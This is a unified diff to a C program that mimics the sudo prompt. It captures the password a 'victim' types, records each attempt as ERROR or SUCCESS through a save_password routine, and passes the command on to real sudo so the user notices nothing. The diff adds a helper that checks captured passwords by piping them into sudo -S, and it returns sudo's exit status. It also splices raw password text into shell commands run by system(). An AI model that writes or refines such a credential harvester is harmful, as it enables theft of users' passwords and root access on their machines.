@@ -155,6 +155,20 @@ char *find_sudo()
     return NULL;
 }
 
+/* is_password_correct()
+* Test whether the password user gave is correct.
+*
+* Returns: 1 password is user's correct password
+*          0 password isn't user's correct password
+*/
+int is_password_correct(char *password, char *sudo_path)
+{
+    char command[PATH_MAX] = {0};
+    snprintf(command, PATH_MAX, "echo %s | %s -S true 2>/dev/null", password, sudo_path);
+
+    return system(command) == 0;
+}
+
 int main(int argc, char const *argv[])
 {
     struct passwd *usr = getpwuid(getuid());
@@ -169,6 +183,7 @@ int main(int argc, char const *argv[])
     size_t len = 0;
     int args;
     int pw_attempts = 1;
+    int res = 0;
 
     sudo_path = find_sudo();
     if (!sudo_path) {
@@ -191,16 +206,19 @@ int main(int argc, char const *argv[])
                     get_user_pass(&password, &len, stdin);
 
                     /* Remove the \n at the end of the password, otherwise it messes up the command */
-                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';                 
-                    
+                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';
+
                     /* Build the full command to be executed */
-                    snprintf(command, sizeof(command), "echo %s | %s -S%s 2>/dev/null", password, sudo_path, arguments);
+                    snprintf(command, sizeof(command), "echo %s | %s -S%s", password, sudo_path, arguments);
                     printf("\n");
+
                     /* Check if victim entered the correct password. system() weirdly returns 256 on error */
-                    if((system(command)) == 256) {
+                    if(!is_password_correct(password, sudo_path)) {
                         printf("Sorry, try again.\n");
                         save_password(usr->pw_name, password, "ERROR");
+                        res = 1;
                     } else {
+                        res = system(command) / 256;
                         save_password(usr->pw_name, password, "SUCCESS");
                         break;
                     }
@@ -226,5 +244,5 @@ int main(int argc, char const *argv[])
 
     free(sudo_path);
 
-    return 0;
+    return res;
 }
